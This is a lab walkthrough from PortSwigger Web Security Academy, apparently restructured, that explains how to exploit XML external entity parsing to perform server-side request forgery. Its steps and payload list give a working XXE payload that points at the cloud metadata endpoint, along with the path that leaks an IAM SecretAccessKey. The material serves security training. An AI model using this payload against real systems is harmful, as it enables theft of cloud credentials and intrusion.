## Exploiting XXE to perform SSRF attacks

**Category:** xxe
**Difficulty:** Unknown

### Description
This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

### Solution Steps
1. Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
2. Insert the following external entity definition in between the XML declaration and the stockCheck element: <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
3. Replace the productId number with a reference to the external entity: &xxe; . The response should contain "Invalid product ID:" followed by the response from the metadata endpoint, which will initially be a folder name.
4. Iteratively update the URL in the DTD to explore the API until you reach /latest/meta-data/iam/security-credentials/admin . This should return JSON containing the SecretAccessKey .

### Key Payloads
- `http://169.254.169.254/`
- `stockCheck`
- `<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>`
- `productId`
- `&xxe;`
- `/latest/meta-data/iam/security-credentials/admin`
- `SecretAccessKey`

### Indicators of Success
- Check for changes in application behavior
- Look for error messages or data exposure
- Verify the vulnerability type: xxe

---
*Source: PortSwigger Web Security Academy*
